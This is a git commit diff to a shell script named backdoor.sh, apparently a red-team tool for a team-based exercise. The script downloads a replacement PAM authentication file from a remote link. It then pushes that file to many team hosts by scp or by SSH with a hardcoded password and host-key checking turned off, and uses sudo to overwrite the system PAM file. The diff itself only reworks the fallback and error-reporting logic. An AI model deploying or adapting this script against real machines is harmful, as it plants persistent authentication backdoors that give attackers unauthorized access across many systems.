b2f1b5fadd6e0a9aede8bb6813a591e94f072006
sawyer3399 <46585978+sawyer3399@users.noreply.github.com>
2025-03-21 15:34:57 -0500

    Update backdoor.sh

--- backdoor.sh
+++ backdoor.sh
@@ -16,7 +16,6 @@ host_ids=(1 2 3)
 
 main() {
     curl -o "$path_to_tmp_pam" "$link_to_pam"
-    sleep 5
 
     local IPs=()
     for ((team=1; team<=number_of_teams; team++)); do
@@ -32,23 +31,19 @@ main() {
     for IP in "${IPs[@]}"; do
         {
             sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_tmp_pam" "$username@$IP:$path_to_pam" && \
-            echo "SUCCESS  (SCP): $IP" || \
-            {
-                sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
-                    echo \"$password\" | sudo -S apt install -y curl || \
-                    echo \"$password\" | sudo -S yum install -y curl || \
-                    echo \"$password\" | sudo -S zypper install -y curl || \
-                    echo \"$password\" | sudo -S pacman -Syu curl --noconfirm
-                    sleep 5
-                    echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\"
-                    sleep 5
-                    echo \"$password\" | sudo -S mv \"$path_to_tmp_pam\" \"$path_to_pam\"
-                " && \
-                echo "SUCCESS (CURL): $IP" || \
-                echo -e "\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n" \
-                        "FAIL    (CURL): $IP !!\n" \
-                        "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
-            }
+            echo "SUCCESS        (SCP): $IP" || \
+            sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
+                echo \"$password\" | sudo -S apt install -y curl && \
+                echo \"$password\" | sudo -S yum install -y curl && \
+                echo \"$password\" | sudo -S zypper install -y curl && \
+                echo \"$password\" | sudo -S pacman -Syu curl --noconfirm && \
+                echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\" && \
+                echo \"$password\" | sudo -S mv \"$path_to_tmp_pam\" \"$path_to_pam\"
+            " && \
+            echo "SUCCESS       (CURL): $IP" || \
+            echo -e "\n!!!!!!!!!!!!!!!!!!!!!\n" \
+                 "FAIL   (SSH or CURL): $IP !!\n" \
+                 "!!!!!!!!!!!!!!!!!!!!!\n"
         } &
         ((job_count++))
         if ((job_count >= max_jobs)); then
